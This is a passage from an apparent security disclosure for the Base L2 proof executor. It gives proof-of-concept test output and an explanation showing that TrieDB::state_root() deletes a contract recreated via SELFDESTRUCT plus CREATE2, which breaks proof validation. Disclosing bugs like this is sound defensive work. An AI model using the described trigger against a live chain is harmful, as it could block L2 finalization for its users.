  Initial state root (before block 2):  0x511e45ad2e2de3942e3582540c629c5aea5f3481110afeab1abad3dd285b96cb
  TrieDB::state_root() result (BUGGY):  0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421
  Expected correct state root:          0xebfd787f087ffc281f92f9ee3e5216a00e88b6d1d61904e180263919f3d962b4

  Buggy root == EMPTY_ROOT_HASH?  true (account was DELETED!)
  Correct root == EMPTY_ROOT_HASH? false (account should be preserved)
  Buggy == Correct?                false

=== VERIFICATION ===
  [PASS] TrieDB::state_root() == EMPTY_ROOT_HASH (account deleted by bug)
  [PASS] Correct root != EMPTY_ROOT_HASH (account preserved)
  [PASS] State roots diverge (buggy TrieDB != correct)

=== RESULT ===
CONFIRMED: TrieDB::state_root() (the real proof executor code path)
unconditionally deletes DestroyedChanged accounts via
was_destroyed() + continue at db/mod.rs:180-183, producing an
incorrect state root.

  Real Base node executed blocks 1-2 with SELFDESTRUCT + re-CREATE2.
  Block 2 produces DestroyedChanged status for the child contract.
  TrieDB::state_root() result: 0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421 (WRONG, account deleted)
  Expected correct root:       0xebfd787f087ffc281f92f9ee3e5216a00e88b6d1d61904e180263919f3d962b4 (RIGHT, account preserved)

  Impact: epilogue::validate() detects mismatch -> InvalidClaim error.
  Any block containing SELFDESTRUCT + re-CREATE2 at same address will
  fail proof verification, blocking finalization of the L2 chain.

test poc_proof_executor_destroyed_changed_state_root_divergence ... ok
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 5.57s
```

The test starts a real Base L2 node (chain\_id=8453) using `NodeBuilder` + `EngineNodeLauncher` with the full execution layer. Blocks 1 and 2 are advanced by injecting signed transactions via `rpc.inject_tx` through the Engine API. Real execution confirms the child contract undergoes SELFDESTRUCT + re-CREATE2 in block 2, producing `DestroyedChanged` status. The PoC then directly calls the real `TrieDB::state_root()` method (production code exported by the `base_proof_executor` crate), which internally calls `update_accounts()` (`db/mod.rs:164`) and hits the `was_destroyed() → delete → continue` branch at line 180, deleting the recreated account entirely from the trie. `state_root()` returns `EMPTY_ROOT_HASH` (`0x56e8...b421`), while the correct state root should be `0xebfd...62b4` (account preserved with new storage). All 3 assertions pass, confirming that the real proof executor code path produces an incorrect state root that will cause `epilogue::validate()` to throw an `InvalidClaim` error.
